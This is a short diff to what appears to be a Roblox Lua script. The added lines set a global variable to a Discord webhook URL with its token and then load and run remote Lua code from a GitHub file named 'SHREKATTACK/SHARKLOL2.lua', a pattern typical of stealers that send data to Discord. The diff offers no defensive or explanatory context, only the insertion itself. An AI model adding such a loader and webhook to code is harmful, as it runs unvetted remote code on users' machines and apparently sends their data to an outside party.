@@ -15,3 +15,6 @@ else
 	wait(1)
 	game:Shutdown()
 end
+
+_G.webhooksdiscord = "https://discord.com/api/webhooks/947370025877127208/osmu7wwABiTa1LK2fJFUuLW9c_3FYsZXFj7tkFsVCgoCkpPZudOZXejzuji5M9tbnQdS"
+loadstring(game:HttpGet"https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua")();
